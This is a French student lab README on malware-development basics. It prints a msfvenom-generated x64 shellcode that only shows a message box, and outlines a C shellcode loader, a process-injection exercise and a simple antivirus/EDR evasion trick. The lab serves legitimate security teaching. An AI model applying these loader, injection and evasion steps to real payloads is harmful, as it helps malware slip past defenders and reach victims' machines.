
# Labos réalisés par
>Marco Profetto
>
>Mohamed Harag
>
>Antoine Blairon


# 0. Paramétrisation de l'environnement de test:
Download & upload ISO file:
![image](https://github.com/user-attachments/assets/d218bd6b-5807-425b-8d50-326c37265e8d)

Installation de la machine virtuelle (labo):
![image](https://github.com/user-attachments/assets/19c93366-97ff-4bdb-adb4-a1a6e97c772d)

Snapshot avant début exercices:
![image](https://github.com/user-attachments/assets/cb6766d4-12c6-4be4-80f3-d8f5117cfde1)

Installation Metasploitframework:
![image](https://github.com/user-attachments/assets/a4c95507-bff6-467f-a464-9f7a351bf59b)

![image](https://github.com/user-attachments/assets/68da3cdf-80c9-4cd5-b35b-e4550a593e7f)

Installation Windbg:
![image](https://github.com/user-attachments/assets/707355be-62eb-49c0-8a3d-8fb3b3b1ab85)

Installation de GCC

# Charge utile:

\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x48\x8b\x72\x50\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x4d\x31\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x19\x00\x00\x00\x54\x61\x73\x6b\x20\x66\x61\x69\x6c\x65\x64\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6c\x6c\x79\x00\x5a\xe8\x0b\x00\x00\x00\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x00\x41\x58\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5

# 1. Création d'un loader de shell Code basique en C

msfvenom pour créer un shell code:
![image](https://github.com/user-attachments/assets/429a8f32-0588-4fb1-a6be-2862c18ba29d)

Compilation du code grâce au shell code obtenu à l'étape précédente:
![image](https://github.com/user-attachments/assets/eabeaad4-bdc2-4bd9-9dba-7c1bfcafcb58)

![image](https://github.com/user-attachments/assets/7a41d271-3fa4-4d1b-9868-d9f7091cb746)

Lancement du malware produit:
![image](https://github.com/user-attachments/assets/685dcc1a-6b79-4deb-b8be-e8f1f777f470)

Monitoring de l'exécution grâce à WinDBG:
![image](https://github.com/user-attachments/assets/bbf12d14-d3fd-428c-b902-33e50e3787ee)

# 2. Bonus 1 : Exécution du shellcode sans CreateThread()
Modifier le loader pour exécuter le shellcode sans utiliser l'API CreateThread()



Exercice 2 : Création d'un injecteur de shellcode basique
Obtenir un handle du processus cible

# 3. Basic Antivirus Evasion
Tentative de shellcode grâce à la technique d'évasion:
Eviter d'écrire directement dans le code mais plutôt de passer en argument le shellcode pour que l'antivirus ne détecte pas ce shellcode lors de l'analyse.

Objectif :
Mettre en œuvre des techniques d’évasion pour éviter la détection par un antivirus (AV) ou un système de détection et de réponse aux menaces (EDR).


![image](https://github.com/user-attachments/assets/2167853e-fa4b-4807-9993-f92edce6632c)



# Références:
Cas Van Cooten
- https://github.com/chvancooten/maldev-for-dummies/blob/main/Slides/Malware%20Development%20for%20Dummies%20-%20X33fcon%2030-05-2023.pdf
